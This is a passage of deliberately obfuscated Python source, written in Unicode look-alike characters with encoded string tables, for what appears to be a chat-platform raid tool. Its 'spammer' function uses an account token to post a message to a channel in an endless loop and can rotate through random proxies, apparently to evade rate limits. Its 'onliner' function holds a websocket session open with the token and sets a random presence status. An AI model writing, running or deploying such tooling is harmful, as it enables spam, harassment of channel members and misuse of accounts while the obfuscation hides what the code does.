            𝗽𝘳𝗶𝘯𝘵(f"{𝘳}{𝙈𝗠𝘕𝙄𝘔𝙄𝘔𝗜𝗹𝗠𝗡𝗡𝗠𝗡𝗹𝘔𝙈𝙡𝗠𝙄𝘭𝙄𝗡𝗜𝙉𝘕𝗜𝙈𝗡𝗡𝘐𝘭[91]}{𝘥𝙖𝘵𝘦𝙩𝗶𝗺𝙚.datetime.now().strftime(f'{𝗴}{𝙈𝙈𝙉𝗜𝗠𝘐𝗠𝗜𝘭𝙈𝗡𝙉𝗠𝙉𝘭𝙈𝙈𝙡𝘔𝗜𝘭𝘐𝗡𝗜𝘕𝙉𝘐𝗠𝘕𝙉𝘐𝙡[92]}{𝙧}')}{𝗠𝗠𝙉𝗜𝙈𝙄𝘔𝗜𝗹𝙈𝙉𝗡𝙈𝙉𝙡𝘔𝗠𝘭𝘔𝙄𝘭𝘐𝘕𝗜𝘕𝗡𝗜𝙈𝙉𝙉𝙄𝙡[93]}{𝗿}{𝘔𝘔𝙉𝘐𝗠𝘐𝘔𝘐𝘭𝘔𝙉𝗡𝙈𝙉𝙡𝙈𝘔𝙡𝘔𝙄𝗹𝗜𝘕𝗜𝗡𝗡𝙄𝙈𝗡𝗡𝙄𝗹[91]}{𝙡𝙘}{𝙈𝗠𝙉𝙄𝘔𝘐𝙈𝙄𝗹𝗠𝗡𝙉𝗠𝗡𝙡𝘔𝘔𝗹𝗠𝙄𝘭𝘐𝗡𝘐𝗡𝙉𝘐𝗠𝙉𝘕𝘐𝗹[268]}{𝗿}{𝘔𝘔𝗡𝗜𝗠𝘐𝗠𝙄𝘭𝗠𝗡𝙉𝙈𝗡𝘭𝘔𝗠𝘭𝗠𝘐𝘭𝗜𝙉𝘐𝗡𝘕𝗜𝗠𝗡𝙉𝙄𝘭[93]}{𝘯𝗻}{𝙜}{𝙈𝘔𝘕𝗜𝙈𝗜𝙈𝘐𝙡𝙈𝘕𝗡𝘔𝘕𝙡𝗠𝘔𝘭𝘔𝙄𝙡𝗜𝗡𝘐𝘕𝙉𝙄𝙈𝘕𝘕𝙄𝘭[249]}")
        elif 𝗿𝗿.status_code == 403:
            𝘱𝙧𝗶𝙣𝘁(f"{𝘳}{𝘔𝗠𝘕𝙄𝗠𝗜𝗠𝙄𝘭𝙈𝗡𝗡𝙈𝗡𝘭𝘔𝗠𝗹𝘔𝗜𝙡𝙄𝙉𝘐𝗡𝙉𝙄𝗠𝙉𝘕𝙄𝙡[91]}{𝗱𝘢𝘵𝙚𝘁𝙞𝙢𝗲.datetime.now().strftime(f'{𝙜}{𝙈𝙈𝙉𝗜𝗠𝙄𝙈𝘐𝘭𝘔𝙉𝗡𝗠𝙉𝗹𝘔𝙈𝗹𝙈𝘐𝗹𝙄𝙉𝙄𝗡𝘕𝘐𝘔𝘕𝗡𝗜𝗹[92]}{𝗿}')}{𝙈𝘔𝗡𝗜𝙈𝘐𝙈𝘐𝘭𝘔𝗡𝗡𝙈𝘕𝘭𝙈𝘔𝗹𝙈𝗜𝙡𝘐𝗡𝗜𝗡𝗡𝘐𝗠𝘕𝙉𝗜𝘭[93]}{𝙧}{𝙈𝙈𝙉𝙄𝗠𝘐𝙈𝙄𝙡𝘔𝗡𝘕𝗠𝗡𝗹𝗠𝘔𝘭𝗠𝘐𝙡𝗜𝙉𝗜𝗡𝙉𝘐𝙈𝙉𝙉𝘐𝗹[91]}{𝗯}{𝘔𝙈𝘕𝘐𝙈𝘐𝘔𝗜𝙡𝗠𝘕𝗡𝙈𝙉𝗹𝘔𝘔𝗹𝗠𝘐𝗹𝙄𝘕𝙄𝘕𝘕𝘐𝘔𝘕𝗡𝗜𝘭[269]}{𝙧}{𝘔𝙈𝘕𝗜𝙈𝙄𝙈𝗜𝙡𝗠𝙉𝙉𝙈𝙉𝘭𝘔𝗠𝘭𝗠𝗜𝗹𝘐𝗡𝘐𝘕𝘕𝘐𝘔𝙉𝙉𝘐𝙡[93]}{𝗻𝙣}{𝗴}{𝙈𝘔𝘕𝙄𝗠𝗜𝗠𝗜𝙡𝙈𝗡𝘕𝘔𝗡𝗹𝗠𝗠𝙡𝙈𝘐𝘭𝘐𝗡𝘐𝗡𝘕𝗜𝙈𝘕𝙉𝘐𝙡[270]}{𝙧𝗿.text}")
            return
        else:
            𝙥𝘳𝘪𝗻𝙩(f"{𝙧}{𝙈𝘔𝘕𝘐𝗠𝗜𝘔𝗜𝙡𝗠𝙉𝙉𝙈𝘕𝘭𝙈𝗠𝘭𝗠𝙄𝘭𝘐𝙉𝘐𝙉𝙉𝗜𝘔𝗡𝘕𝙄𝘭[91]}{𝗱𝘢𝘁𝘦𝙩𝘪𝗺𝘦.datetime.now().strftime(f'{𝙜}{𝗠𝘔𝙉𝘐𝙈𝗜𝙈𝘐𝘭𝙈𝗡𝙉𝘔𝗡𝗹𝙈𝘔𝘭𝙈𝘐𝙡𝙄𝘕𝘐𝙉𝘕𝙄𝙈𝘕𝙉𝙄𝗹[92]}{𝙧}')}{𝙈𝙈𝘕𝙄𝘔𝙄𝙈𝙄𝙡𝙈𝘕𝘕𝙈𝘕𝘭𝘔𝗠𝘭𝗠𝘐𝘭𝘐𝘕𝘐𝙉𝘕𝗜𝗠𝗡𝙉𝗜𝘭[93]}{𝙧}{𝘔𝗠𝗡𝘐𝘔𝘐𝙈𝙄𝙡𝙈𝘕𝘕𝗠𝘕𝘭𝗠𝙈𝘭𝙈𝙄𝙡𝙄𝙉𝘐𝙉𝙉𝘐𝙈𝙉𝗡𝘐𝘭[91]}{𝙗}{𝗠𝗠𝘕𝗜𝙈𝙄𝘔𝘐𝙡𝗠𝗡𝙉𝙈𝘕𝘭𝙈𝗠𝗹𝘔𝘐𝘭𝙄𝘕𝙄𝙉𝙉𝗜𝙈𝙉𝗡𝙄𝘭[269]}{𝙧}{𝗠𝗠𝘕𝘐𝘔𝙄𝗠𝙄𝘭𝙈𝘕𝘕𝙈𝘕𝗹𝙈𝗠𝙡𝙈𝙄𝙡𝗜𝗡𝗜𝘕𝗡𝘐𝙈𝙉𝘕𝗜𝘭[93]}{𝘯𝙣}{𝘨}{𝗠𝘔𝗡𝘐𝗠𝗜𝘔𝗜𝘭𝗠𝘕𝗡𝗠𝙉𝙡𝘔𝙈𝗹𝗠𝙄𝙡𝙄𝘕𝘐𝘕𝙉𝗜𝗠𝙉𝘕𝙄𝘭[270]}{𝙧𝘳.text}")

def spammer(token, channel, message, delay):
    𝗵𝗲𝙖𝘥𝙚𝗿𝘴 = 𝗛𝘦𝗮𝙙𝙚𝘳𝘀(𝘵𝘰𝙠𝗲𝗻)
    while True:
        𝙙𝙣 = 𝘵𝘰𝙠𝘦𝗻.split(𝙈𝙈𝙉𝘐𝘔𝙄𝙈𝗜𝙡𝗠𝗡𝘕𝘔𝙉𝙡𝗠𝘔𝗹𝗠𝙄𝙡𝘐𝗡𝗜𝗡𝙉𝘐𝘔𝗡𝗡𝘐𝗹[247])
        𝗻𝙣 = 𝗱𝘯[0]
        𝘥𝙖𝘁𝗮 = {𝗠𝘔𝘕𝗜𝙈𝗜𝗠𝙄𝙡𝘔𝘕𝘕𝗠𝗡𝙡𝗠𝙈𝗹𝘔𝗜𝗹𝘐𝘕𝘐𝘕𝘕𝗜𝘔𝗡𝙉𝙄𝙡[265]: 𝘮𝙚𝘴𝙨𝘢𝗴𝗲}
        𝘀𝙡𝙚𝘦𝗽(𝙙𝙚𝗹𝘢𝘆)
        if 𝗽𝗿𝗼𝘅𝘺:
            𝘳𝘳 = 𝘳𝘦𝘲𝙪𝙚𝘴𝘁𝘀.post(f'{𝘔𝗠𝙉𝙄𝘔𝘐𝙈𝗜𝙡𝗠𝘕𝗡𝘔𝗡𝙡𝘔𝗠𝘭𝙈𝘐𝙡𝙄𝙉𝙄𝙉𝗡𝘐𝗠𝙉𝗡𝗜𝙡[266]}{𝘤𝗵𝘢𝘯𝘯𝗲𝘭}{𝘔𝘔𝗡𝘐𝘔𝙄𝗠𝙄𝘭𝙈𝙉𝙉𝗠𝘕𝗹𝙈𝙈𝙡𝘔𝘐𝙡𝘐𝘕𝙄𝗡𝗡𝙄𝙈𝘕𝙉𝘐𝗹[267]}', headers=𝘩𝘦𝙖𝗱𝘦𝗿𝙨, json=𝘥𝙖𝘵𝗮, proxy={𝘔𝘔𝗡𝙄𝗠𝘐𝗠𝗜𝙡𝘔𝗡𝗡𝙈𝘕𝗹𝗠𝘔𝘭𝗠𝙄𝗹𝘐𝗡𝙄𝙉𝙉𝘐𝗠𝙉𝙉𝘐𝗹[244]: 𝙈𝘔𝗡𝘐𝗠𝙄𝙈𝘐𝘭𝗠𝘕𝗡𝙈𝘕𝙡𝘔𝙈𝗹𝗠𝙄𝙡𝗜𝙉𝘐𝗡𝙉𝘐𝙈𝘕𝗡𝙄𝗹[246] + 𝙧𝙖𝗻𝘥𝗼𝘮.choice(𝙥𝘳𝘰𝙭𝙞𝙚𝘴), 𝗠𝘔𝙉𝘐𝗠𝙄𝙈𝗜𝗹𝗠𝗡𝙉𝘔𝘕𝘭𝗠𝗠𝙡𝗠𝙄𝗹𝗜𝙉𝙄𝗡𝘕𝘐𝗠𝙉𝘕𝙄𝙡[245]: 𝗠𝘔𝗡𝙄𝗠𝘐𝗠𝗜𝙡𝙈𝙉𝘕𝘔𝗡𝘭𝙈𝗠𝘭𝗠𝘐𝙡𝙄𝙉𝙄𝙉𝙉𝙄𝘔𝙉𝘕𝘐𝗹[246] + 𝙧𝙖𝘯𝘥𝗼𝗺.choice(𝘱𝘳𝗼𝘅𝘪𝙚𝘀)})
        else:
            𝗿𝗿 = 𝘳𝗲𝙦𝘂𝘦𝘴𝙩𝙨.post(f'{𝗠𝗠𝙉𝘐𝗠𝗜𝘔𝙄𝙡𝗠𝘕𝙉𝙈𝗡𝘭𝗠𝗠𝗹𝘔𝗜𝘭𝘐𝙉𝘐𝗡𝘕𝗜𝗠𝙉𝙉𝘐𝙡[266]}{𝗰𝗵𝙖𝘯𝘯𝘦𝙡}{𝘔𝗠𝙉𝗜𝘔𝙄𝙈𝙄𝗹𝗠𝗡𝙉𝗠𝘕𝙡𝗠𝙈𝙡𝙈𝙄𝘭𝗜𝗡𝘐𝗡𝗡𝗜𝗠𝘕𝗡𝙄𝗹[267]}', headers=𝙝𝗲𝗮𝗱𝙚𝘳𝘴, json=𝘥𝘢𝙩𝘢)
        if 𝗿𝗿.status_code == 200:
            𝙥𝗿𝘪𝙣𝘵(f"{𝘳}{𝘔𝘔𝗡𝘐𝙈𝘐𝘔𝗜𝘭𝘔𝙉𝘕𝙈𝙉𝙡𝙈𝙈𝗹𝘔𝗜𝘭𝙄𝙉𝙄𝗡𝘕𝙄𝙈𝙉𝙉𝗜𝘭[91]}{𝙙𝘢𝘁𝘦𝘁𝙞𝙢𝙚.datetime.now().strftime(f'{𝗴}{𝙈𝗠𝙉𝗜𝗠𝙄𝗠𝘐𝙡𝘔𝗡𝙉𝙈𝗡𝙡𝘔𝘔𝙡𝙈𝗜𝙡𝙄𝗡𝘐𝗡𝗡𝗜𝘔𝗡𝘕𝙄𝘭[92]}{𝘳}')}{𝗠𝗠𝘕𝗜𝙈𝘐𝗠𝗜𝗹𝗠𝗡𝙉𝗠𝘕𝙡𝗠𝗠𝘭𝘔𝗜𝘭𝘐𝗡𝗜𝗡𝗡𝙄𝘔𝗡𝙉𝙄𝙡[93]}{𝘳}{𝗠𝘔𝘕𝘐𝙈𝗜𝙈𝗜𝗹𝘔𝘕𝘕𝙈𝘕𝘭𝗠𝘔𝘭𝘔𝙄𝗹𝙄𝘕𝙄𝗡𝘕𝘐𝙈𝗡𝘕𝘐𝗹[91]}{𝘭𝗰}{𝙈𝙈𝘕𝙄𝙈𝗜𝗠𝘐𝙡𝙈𝙉𝗡𝗠𝗡𝗹𝗠𝙈𝙡𝗠𝙄𝘭𝙄𝘕𝙄𝙉𝗡𝙄𝘔𝘕𝗡𝘐𝙡[268]}{𝗿}{𝙈𝙈𝗡𝙄𝙈𝙄𝙈𝘐𝙡𝙈𝗡𝙉𝗠𝗡𝗹𝗠𝘔𝙡𝘔𝗜𝙡𝗜𝙉𝗜𝘕𝘕𝗜𝗠𝙉𝙉𝘐𝗹[93]}{𝘯𝙣}{𝙜}{𝙈𝘔𝙉𝘐𝘔𝙄𝙈𝙄𝙡𝘔𝗡𝘕𝗠𝙉𝘭𝘔𝘔𝙡𝙈𝙄𝗹𝘐𝙉𝙄𝗡𝘕𝘐𝘔𝗡𝙉𝙄𝙡[249]}")
        elif 𝗿𝙧.status_code == 403:
            𝙥𝘳𝘪𝘯𝙩(f"{𝙧}{𝗠𝘔𝙉𝙄𝘔𝙄𝘔𝘐𝗹𝗠𝗡𝙉𝘔𝗡𝙡𝗠𝙈𝙡𝙈𝙄𝙡𝘐𝙉𝗜𝗡𝗡𝗜𝙈𝙉𝗡𝙄𝗹[91]}{𝘥𝘢𝙩𝗲𝙩𝗶𝘮𝗲.datetime.now().strftime(f'{𝙜}{𝘔𝗠𝘕𝗜𝗠𝗜𝙈𝗜𝗹𝗠𝙉𝘕𝙈𝙉𝙡𝙈𝘔𝘭𝙈𝗜𝗹𝙄𝙉𝘐𝘕𝙉𝙄𝗠𝗡𝙉𝘐𝘭[92]}{𝗿}')}{𝘔𝙈𝘕𝘐𝗠𝙄𝗠𝙄𝗹𝙈𝙉𝗡𝙈𝙉𝗹𝘔𝙈𝗹𝘔𝘐𝘭𝗜𝘕𝗜𝙉𝙉𝘐𝘔𝗡𝙉𝙄𝙡[93]}{𝗿}{𝙈𝙈𝗡𝘐𝗠𝗜𝙈𝙄𝗹𝙈𝘕𝗡𝘔𝗡𝗹𝗠𝙈𝗹𝗠𝙄𝘭𝗜𝗡𝘐𝙉𝗡𝗜𝘔𝗡𝙉𝙄𝙡[91]}{𝗯}{𝘔𝙈𝘕𝘐𝙈𝘐𝙈𝗜𝙡𝗠𝘕𝗡𝘔𝗡𝘭𝙈𝙈𝘭𝗠𝗜𝘭𝙄𝗡𝗜𝘕𝙉𝗜𝘔𝘕𝙉𝙄𝘭[269]}{𝗿}{𝙈𝗠𝙉𝘐𝘔𝙄𝙈𝗜𝙡𝗠𝙉𝘕𝙈𝘕𝗹𝙈𝘔𝘭𝙈𝘐𝗹𝙄𝘕𝙄𝘕𝗡𝙄𝗠𝘕𝙉𝗜𝗹[93]}{𝙣𝗻}{𝘨}{𝗠𝙈𝗡𝗜𝗠𝗜𝗠𝗜𝗹𝗠𝗡𝘕𝘔𝙉𝙡𝗠𝙈𝙡𝗠𝙄𝙡𝙄𝘕𝗜𝙉𝙉𝘐𝗠𝙉𝙉𝘐𝘭[270]}{𝗿𝙧.text}")
            return
        else:
            𝗽𝘳𝘪𝙣𝘁(f"{𝘳}{𝗠𝙈𝘕𝙄𝗠𝘐𝗠𝗜𝙡𝙈𝙉𝗡𝘔𝗡𝙡𝗠𝙈𝗹𝙈𝘐𝗹𝗜𝗡𝘐𝗡𝘕𝗜𝘔𝘕𝗡𝘐𝙡[91]}{𝗱𝙖𝘁𝘦𝘵𝘪𝘮𝘦.datetime.now().strftime(f'{𝘨}{𝙈𝘔𝙉𝘐𝙈𝙄𝙈𝗜𝗹𝙈𝗡𝗡𝗠𝗡𝙡𝘔𝙈𝙡𝘔𝙄𝙡𝘐𝙉𝗜𝘕𝘕𝗜𝙈𝙉𝘕𝘐𝘭[92]}{𝙧}')}{𝗠𝘔𝙉𝘐𝙈𝗜𝘔𝘐𝗹𝘔𝗡𝙉𝗠𝗡𝗹𝗠𝘔𝗹𝙈𝗜𝙡𝘐𝙉𝙄𝗡𝘕𝗜𝘔𝙉𝗡𝗜𝗹[93]}{𝘳}{𝘔𝙈𝘕𝗜𝙈𝙄𝘔𝗜𝘭𝗠𝘕𝙉𝙈𝘕𝘭𝙈𝘔𝙡𝙈𝘐𝗹𝗜𝗡𝘐𝘕𝙉𝙄𝗠𝗡𝗡𝘐𝗹[91]}{𝗯}{𝘔𝘔𝘕𝗜𝙈𝙄𝙈𝗜𝗹𝗠𝘕𝙉𝙈𝘕𝗹𝙈𝗠𝙡𝙈𝙄𝗹𝘐𝙉𝘐𝘕𝗡𝙄𝙈𝙉𝘕𝙄𝘭[269]}{𝘳}{𝗠𝗠𝘕𝗜𝘔𝗜𝗠𝗜𝗹𝙈𝙉𝗡𝘔𝙉𝘭𝘔𝙈𝗹𝙈𝙄𝘭𝘐𝗡𝘐𝗡𝘕𝙄𝙈𝗡𝘕𝗜𝘭[93]}{𝗻𝙣}{𝗴}{𝙈𝘔𝙉𝗜𝙈𝙄𝙈𝘐𝗹𝘔𝙉𝙉𝘔𝙉𝙡𝘔𝘔𝗹𝙈𝙄𝙡𝙄𝙉𝙄𝗡𝘕𝘐𝙈𝘕𝘕𝙄𝘭[270]}{𝙧𝗿.text}{𝙈𝗠𝗡𝘐𝙈𝗜𝙈𝙄𝘭𝘔𝙉𝙉𝘔𝘕𝘭𝘔𝙈𝗹𝘔𝗜𝙡𝗜𝗡𝘐𝗡𝗡𝗜𝘔𝘕𝙉𝙄𝗹[98]}{𝗿𝘳.status_code}")

def onliner(token):
    𝙨𝘁𝗮𝙩𝘶𝙨 = [𝘔𝘔𝗡𝙄𝘔𝘐𝙈𝗜𝗹𝘔𝘕𝗡𝘔𝗡𝙡𝗠𝙈𝙡𝘔𝙄𝙡𝗜𝘕𝗜𝘕𝗡𝗜𝙈𝘕𝘕𝘐𝗹[271], 𝙈𝘔𝘕𝗜𝘔𝘐𝗠𝙄𝘭𝙈𝙉𝘕𝘔𝗡𝙡𝗠𝗠𝙡𝘔𝙄𝘭𝙄𝘕𝗜𝙉𝗡𝙄𝗠𝙉𝙉𝘐𝘭[272], 𝘔𝙈𝘕𝘐𝙈𝗜𝗠𝙄𝙡𝘔𝙉𝗡𝙈𝗡𝘭𝗠𝘔𝗹𝗠𝗜𝘭𝘐𝗡𝗜𝙉𝘕𝗜𝘔𝘕𝘕𝙄𝙡[273]]
    𝘸𝙨 = 𝘄𝗲𝙗𝘴𝙤𝗰𝙠𝗲𝘵.WebSocket()
    𝙬𝘴.connect(𝗠𝙈𝗡𝙄𝙈𝙄𝘔𝗜𝗹𝘔𝗡𝘕𝗠𝗡𝗹𝙈𝙈𝘭𝗠𝘐𝙡𝗜𝙉𝙄𝗡𝙉𝙄𝙈𝗡𝗡𝗜𝙡[274])
    𝘳𝙧 = 𝙬𝘴.recv()
    𝘦𝘷𝙚𝘯𝘵 = 𝗷𝘴𝗼𝘯.loads(𝗿𝘳)
    𝙝𝙚𝙖𝗿𝙩𝗯𝗲𝘢𝘵_𝘪𝗻𝘵𝗲𝗿𝙫𝙖𝙡 = 𝙚𝘃𝗲𝘯𝙩[𝗠𝗠𝙉𝙄𝙈𝘐𝗠𝙄𝗹𝘔𝗡𝘕𝘔𝗡𝗹𝙈𝗠𝗹𝘔𝗜𝗹𝗜𝙉𝗜𝘕𝘕𝗜𝘔𝘕𝘕𝙄𝗹[166]][𝙈𝗠𝙉𝗜𝙈𝗜𝗠𝗜𝙡𝙈𝙉𝙉𝙈𝗡𝙡𝘔𝘔𝘭𝘔𝙄𝗹𝘐𝙉𝗜𝙉𝙉𝘐𝘔𝙉𝙉𝗜𝘭[199]] / 1000
    𝗮𝘶𝘵𝗵 = {𝘔𝘔𝗡𝘐𝙈𝗜𝘔𝘐𝙡𝗠𝘕𝗡𝙈𝗡𝗹𝘔𝘔𝘭𝘔𝙄𝗹𝘐𝙉𝗜𝗡𝘕𝙄𝗠𝗡𝙉𝗜𝗹[169]: 2, 𝘔𝗠𝗡𝗜𝘔𝗜𝗠𝘐𝘭𝙈𝗡𝗡𝘔𝘕𝘭𝘔𝘔𝗹𝘔𝗜𝙡𝘐𝗡𝙄𝙉𝙉𝗜𝗠𝗡𝙉𝘐𝙡[166]: {𝗠𝗠𝘕𝘐𝘔𝗜𝘔𝗜𝗹𝗠𝙉𝗡𝘔𝙉𝙡𝙈𝗠𝘭𝘔𝘐𝙡𝙄𝘕𝙄𝘕𝗡𝗜𝘔𝙉𝙉𝙄𝙡[253]: 𝙩𝘰𝗸𝙚𝘯, 𝘔𝗠𝗡𝘐𝘔𝗜𝘔𝗜𝘭𝘔𝗡𝘕𝘔𝘕𝗹𝗠𝙈𝘭𝗠𝗜𝘭𝘐𝗡𝗜𝗡𝘕𝗜𝘔𝙉𝗡𝙄𝗹[275]: 61, 𝗠𝙈𝙉𝘐𝙈𝘐𝙈𝙄𝘭𝗠𝗡𝙉𝘔𝘕𝘭𝙈𝘔𝗹𝘔𝗜𝘭𝙄𝙉𝗜𝘕𝘕𝗜𝗠𝘕𝗡𝙄𝗹[254]: {𝙈𝘔𝙉𝗜𝙈𝙄𝗠𝗜𝗹𝗠𝙉𝙉𝘔𝙉𝗹𝗠𝗠𝘭𝘔𝗜𝘭𝘐𝗡𝗜𝘕𝙉𝗜𝘔𝙉𝙉𝗜𝗹[106]: 𝘔𝙈𝗡𝙄𝙈𝙄𝙈𝗜𝙡𝙈𝗡𝘕𝗠𝗡𝗹𝙈𝘔𝘭𝙈𝘐𝘭𝗜𝘕𝘐𝙉𝙉𝘐𝗠𝗡𝙉𝗜𝘭[118], 𝙈𝗠𝗡𝗜𝗠𝙄𝙈𝙄𝘭𝗠𝘕𝘕𝘔𝙉𝙡𝗠𝙈𝗹𝙈𝘐𝙡𝗜𝙉𝘐𝙉𝙉𝘐𝙈𝙉𝗡𝘐𝗹[107]: 𝙈𝙈𝗡𝗜𝗠𝗜𝘔𝗜𝗹𝗠𝗡𝙉𝗠𝘕𝘭𝙈𝙈𝗹𝗠𝙄𝘭𝗜𝙉𝗜𝙉𝙉𝙄𝙈𝙉𝙉𝗜𝙡[284], 𝘔𝗠𝗡𝗜𝗠𝘐𝙈𝙄𝘭𝘔𝘕𝙉𝗠𝘕𝘭𝙈𝙈𝗹𝘔𝙄𝗹𝙄𝙉𝗜𝙉𝙉𝙄𝗠𝙉𝘕𝘐𝗹[279]: 𝙈𝘔𝗡𝗜𝘔𝙄𝘔𝙄𝗹𝘔𝗡𝙉𝘔𝙉𝗹𝙈𝙈𝘭𝗠𝙄𝘭𝙄𝘕𝙄𝙉𝙉𝘐𝗠𝘕𝘕𝙄𝗹[22], 𝙈𝗠𝙉𝘐𝘔𝙄𝗠𝗜𝙡𝙈𝘕𝙉𝙈𝙉𝙡𝘔𝘔𝘭𝗠𝘐𝘭𝙄𝙉𝘐𝗡𝗡𝗜𝘔𝙉𝙉𝘐𝗹[112]: 𝙈𝗠𝘕𝙄𝘔𝙄𝘔𝘐𝘭𝘔𝙉𝗡𝙈𝘕𝗹𝗠𝘔𝗹𝘔𝘐𝙡𝗜𝙉𝗜𝙉𝘕𝙄𝙈𝙉𝙉𝘐𝘭[285], 𝗠𝘔𝘕𝘐𝗠𝘐𝙈𝙄𝙡𝘔𝙉𝗡𝙈𝙉𝙡𝘔𝗠𝙡𝙈𝘐𝗹𝗜𝘕𝙄𝘕𝗡𝗜𝘔𝗡𝗡𝘐𝙡[113]: 𝘔𝙈𝙉𝗜𝗠𝗜𝗠𝙄𝘭𝙈𝘕𝘕𝘔𝙉𝘭𝙈𝗠𝗹𝙈𝙄𝙡𝘐𝘕𝗜𝘕𝙉𝗜𝘔𝗡𝘕𝘐𝘭[286], 𝘔𝙈𝙉𝙄𝘔𝗜𝗠𝘐𝗹𝘔𝙉𝗡𝙈𝗡𝙡𝘔𝙈𝙡𝙈𝗜𝗹𝘐𝗡𝗜𝘕𝗡𝗜𝘔𝙉𝙉𝘐𝙡[114]: 𝗠𝘔𝗡𝙄𝙈𝘐𝗠𝙄𝘭𝙈𝙉𝙉𝘔𝙉𝙡𝗠𝘔𝘭𝙈𝙄𝙡𝘐𝙉𝗜𝙉𝙉𝘐𝘔𝙉𝗡𝗜𝙡[287], 𝘔𝗠𝙉𝘐𝙈𝙄𝗠𝘐𝗹𝙈𝘕𝙉𝙈𝙉𝘭𝙈𝙈𝗹𝗠𝙄𝙡𝘐𝘕𝘐𝙉𝘕𝙄𝙈𝗡𝘕𝙄𝗹[110]: 𝘔𝗠𝘕𝙄𝗠𝗜𝗠𝘐𝘭𝗠𝗡𝙉𝙈𝘕𝗹𝘔𝙈𝙡𝘔𝘐𝙡𝘐𝙉𝙄𝗡𝘕𝗜𝙈𝗡𝘕𝙄𝘭[288], 𝘔𝗠𝘕𝗜𝘔𝘐𝙈𝘐𝙡𝗠𝙉𝗡𝙈𝘕𝘭𝙈𝗠𝙡𝗠𝘐𝙡𝙄𝗡𝘐𝗡𝘕𝙄𝗠𝙉𝗡𝘐𝘭[280]: 𝘔𝙈𝘕𝙄𝘔𝙄𝗠𝘐𝗹𝘔𝗡𝗡𝙈𝗡𝘭𝗠𝗠𝗹𝗠𝙄𝙡𝘐𝘕𝙄𝙉𝗡𝗜𝘔𝗡𝗡𝗜𝙡[22], 𝘔𝗠𝘕𝙄𝙈𝘐𝗠𝙄𝙡𝗠𝙉𝙉𝙈𝘕𝗹𝗠𝙈𝘭𝘔𝘐𝙡𝘐𝗡𝘐𝙉𝙉𝗜𝙈𝗡𝙉𝘐𝘭[281]: 𝘔𝘔𝙉𝙄𝘔𝗜𝗠𝗜𝙡𝗠𝘕𝙉𝗠𝙉𝗹𝘔𝗠𝘭𝙈𝙄𝘭𝙄𝗡𝗜𝘕𝙉𝙄𝙈𝙉𝙉𝘐𝘭[22], 𝙈𝗠𝗡𝗜𝗠𝘐𝘔𝙄𝘭𝘔𝙉𝗡𝘔𝗡𝗹𝙈𝙈𝙡𝘔𝗜𝘭𝙄𝘕𝗜𝘕𝘕𝘐𝘔𝙉𝗡𝗜𝘭[282]: 𝙈𝘔𝗡𝙄𝙈𝗜𝘔𝘐𝘭𝗠𝘕𝗡𝘔𝗡𝙡𝘔𝙈𝗹𝘔𝙄𝗹𝘐𝙉𝘐𝙉𝙉𝙄𝗠𝘕𝙉𝘐𝗹[22], 𝙈𝙈𝗡𝗜𝙈𝘐𝘔𝙄𝙡𝙈𝗡𝘕𝘔𝙉𝗹𝘔𝘔𝘭𝙈𝗜𝙡𝘐𝗡𝘐𝙉𝗡𝗜𝗠𝘕𝙉𝙄𝙡[283]: 𝘔𝙈𝗡𝙄𝗠𝘐𝗠𝗜𝗹𝘔𝙉𝙉𝙈𝗡𝘭𝙈𝙈𝗹𝗠𝘐𝗹𝙄𝗡𝘐𝘕𝘕𝙄𝗠𝙉𝗡𝗜𝙡[22], 𝗠𝙈𝘕𝙄𝗠𝘐𝙈𝗜𝙡𝙈𝘕𝙉𝘔𝘕𝘭𝙈𝗠𝘭𝙈𝗜𝗹𝗜𝘕𝗜𝗡𝘕𝗜𝗠𝗡𝗡𝗜𝗹[108]: 𝙈𝗠𝗡𝗜𝙈𝘐𝘔𝗜𝗹𝘔𝗡𝘕𝙈𝗡𝙡𝗠𝙈𝙡𝘔𝙄𝘭𝘐𝘕𝙄𝙉𝗡𝙄𝘔𝗡𝘕𝙄𝙡[120], 𝙈𝙈𝗡𝘐𝙈𝗜𝘔𝘐𝗹𝗠𝙉𝗡𝗠𝗡𝘭𝗠𝘔𝙡𝘔𝙄𝗹𝙄𝗡𝙄𝗡𝘕𝙄𝘔𝙉𝙉𝘐𝙡[115]: 𝗠𝗠𝙉𝘐𝗠𝙄𝙈𝙄𝗹𝗠𝗡𝙉𝘔𝘕𝙡𝘔𝗠𝙡𝙈𝙄𝗹𝗜𝘕𝗜𝘕𝘕𝘐𝗠𝘕𝙉𝗜𝗹[289], 𝙈𝗠𝗡𝘐𝙈𝙄𝗠𝘐𝙡𝙈𝙉𝘕𝙈𝗡𝗹𝗠𝘔𝗹𝙈𝙄𝗹𝗜𝙉𝗜𝗡𝘕𝙄𝗠𝘕𝙉𝘐𝘭[117]: 𝙈𝘔𝘕𝘐𝗠𝘐𝗠𝙄𝘭𝘔𝘕𝙉𝗠𝗡𝗹𝙈𝙈𝘭𝙈𝘐𝙡𝘐𝙉𝙄𝘕𝘕𝘐𝘔𝘕𝘕𝘐𝙡[290]}, 𝗠𝘔𝙉𝙄𝘔𝗜𝗠𝙄𝘭𝙈𝘕𝘕𝗠𝗡𝙡𝗠𝗠𝙡𝘔𝘐𝗹𝗜𝙉𝗜𝗡𝘕𝗜𝙈𝙉𝗡𝙄𝙡[276]: {𝘔𝘔𝗡𝘐𝘔𝙄𝘔𝘐𝙡𝘔𝙉𝗡𝗠𝘕𝗹𝘔𝗠𝗹𝘔𝗜𝘭𝙄𝘕𝘐𝙉𝙉𝘐𝘔𝙉𝗡𝗜𝙡[291]: 𝘳𝘢𝘯𝙙𝘰𝘮.choice(𝙨𝙩𝙖𝙩𝘶𝘀), 𝘔𝘔𝘕𝙄𝘔𝗜𝙈𝗜𝗹𝙈𝗡𝗡𝗠𝗡𝙡𝙈𝘔𝗹𝙈𝘐𝗹𝙄𝙉𝗜𝗡𝘕𝙄𝙈𝘕𝙉𝘐𝙡[292]: 0, 𝘔𝘔𝙉𝗜𝙈𝙄𝗠𝙄𝗹𝙈𝗡𝘕𝙈𝙉𝗹𝗠𝙈𝙡𝘔𝙄𝙡𝗜𝗡𝘐𝗡𝘕𝘐𝗠𝙉𝘕𝗜𝙡[293]: [], 𝙈𝘔𝗡𝘐𝙈𝘐𝘔𝙄𝗹𝘔𝗡𝙉𝗠𝙉𝗹𝗠𝗠𝗹𝙈𝘐𝘭𝗜𝙉𝗜𝙉𝘕𝗜𝗠𝘕𝘕𝘐𝙡[294]: False}, 𝗠𝗠𝗡𝘐𝘔𝙄𝗠𝗜𝗹𝘔𝗡𝗡𝗠𝗡𝗹𝘔𝘔𝙡𝘔𝗜𝘭𝘐𝘕𝙄𝙉𝗡𝗜𝘔𝙉𝙉𝗜𝘭[277]: False, 